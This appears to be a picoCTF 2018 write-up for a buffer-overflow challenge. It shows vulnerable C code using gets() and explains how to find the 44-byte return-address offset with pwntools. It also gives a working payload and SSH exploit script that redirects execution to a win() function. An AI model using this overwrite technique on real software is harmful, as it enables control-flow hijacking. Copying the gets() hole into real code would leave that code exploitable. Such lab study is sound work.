Source code

```c
#include <stdio.h>                                                                                            
#include <stdlib.h>                                                                                           
#include <string.h>                                                                                           
#include <unistd.h>                                                                                           
#include <sys/types.h>                                                                                        
#include "asm.h"                                                                                              
                                                                                                              
#define BUFSIZE 32                                                                                            
#define FLAGSIZE 64                                                                                           
                                                                                                              
void win() {                                                                                                  
  char buf[FLAGSIZE];                                                                                         
  FILE *f = fopen("flag.txt","r");                                                                            
  if (f == NULL) {                                                                                            
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on
 the shell server.\n");                                                                                       
    exit(0);                                                                                                  
  }                                                                                                           
                                                                                                              
  fgets(buf,FLAGSIZE,f);                                                                                      
  printf(buf);                                                                                                
}                                                                                                             
                                                                                                              
void vuln(){                                                                                                  
  char buf[BUFSIZE];                                                                                          
  gets(buf);                                                                                                  
                                                                                                              
  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());               
}                                                                                                             
                                                                                                              
int main(int argc, char **argv){                                                                              
                                                                                                              
  setvbuf(stdout, NULL, _IONBF, 0);                                                                           


  gid_t gid = getegid();                                                                                      
  setresgid(gid, gid, gid);                                                                                   
                                                                                                              
  puts("Please enter your string: ");                                                                         
  vuln();                                                                                                     
  return 0;                                                                                                   
}                                                                                                             
```

<br/>

Connect with ssh

```
$ ssh campeon33@2018shell4.picoctf.com
$ /problems/buffer-overflow-1_2_86cbe4de3cdc8986063c379e61f669ba
```

<br/>

First let's generate a cyclic pattern

```python
$ python3
>>> from pwn import *
>>> cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
```

Now let's send it

```
$./vuln               
Please enter your string:                                                                                     
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa          
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c                                              
Segmentation fault (core dumped)                                                                              
```

Finding the offset
```python
>>> cyclic_find(0x6161616c)
44
```

<br/>

Finding the address of the win function

```bash
$ (gdb) disass win
0x080485cb <+0>:     push   %ebp
```

<br/>

Sending the payload

```bash
$ python -c "from pwn import *; print 'A' * 44 + '\xcb\x85\x04\x08'" | ./vuln
```

<br/>

Now the python script

```python
from pwn import *
import paramiko

user = 'yourusername'
password = 'yourpassword'
host = '2018shell4.picoctf.com'

s = ssh(user=user,password=password,host=host)

payload = b'a'*44 + p32(0x080485cb)

p = s.run('cd /problems/buffer-overflow-1_2_86cbe4de3cdc8986063c379e61f669ba && ./vuln')
p.recvuntil('Please enter your string:')
p.sendline(payload)
p.interactive()
```
